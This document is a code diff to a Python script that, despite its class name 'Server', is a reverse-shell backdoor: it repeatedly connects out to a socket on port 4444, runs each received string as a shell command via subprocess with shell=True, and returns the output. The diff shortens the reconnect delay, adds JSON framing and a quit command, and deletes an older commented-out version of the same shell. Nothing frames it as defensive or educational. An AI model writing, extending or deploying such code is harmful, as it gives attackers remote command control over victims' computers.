@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import time
+import json
 
 
 class Server:
@@ -11,7 +12,7 @@ class Server:
 
     def connect(self):
         while True:
-            time.sleep(20)
+            time.sleep(2)
             try:
                 self.server.connect((self.ip, self.port))
                 print("serene self connected")
@@ -23,11 +24,16 @@ class Server:
     def receive_commands_and_execute(self):
         while True:
             try:
-                receive = self.server.recv(1024).decode()
-                result = self.execute_command_on_system(receive)
-                self.server.send(result.encode())
+                receive = self.reliable_receive()
+                split_command = receive.split()
+                if split_command[0] == "quit":
+                    self.server.close()
+                    exit()
+                else:
+                    result = self.execute_command_on_system(receive)
+                    self.reliable_send(result)
             except Exception:
-                self.server.send("We encountered an error.".encode())
+                self.reliable_send("We encountered an error.")
 
     def execute_command_on_system(self, command):
         execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -35,41 +41,19 @@ class Server:
         result = result.decode()
         return result
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.server.send(json_data.encode())
+
+    def reliable_receive(self):
+        data = ''
+        while True:
+            try:
+                data = data + self.server.recv(1024).decode().rstrip()
+                return json.loads(data)
+            except ValueError:
+                continue
+
 
 server = Server('0.0.0.0', 4444)
 server.connect()
-# def execute_command(command):
-#     return subprocess.check_output(command, shell=True)
-#
-#
-# def receive_commands(target):
-#     while True:
-#         try:
-#             receive = target.recv(1024).decode()
-#             execute = subprocess.Popen(receive, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-#                                        stdin=subprocess.PIPE)
-#             result = execute.stdout.read() + execute.stderr.read()
-#             result = result.decode()
-#             target.send(f"{result}".encode())
-#         except Exception:
-#             print("perror")
-#             target.send("We encountered an error.")
-#
-#
-# def connection():
-#     while True:
-#         time.sleep(20)
-#         try:
-#             server.connect(('0.0.0.0', 4444))
-#             print("connected")
-#             break
-#         except Exception:
-#             connection()
-#
-#
-# server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# connection()
-#
-# receive_commands(server)
-# # close the connection
-# server.close()
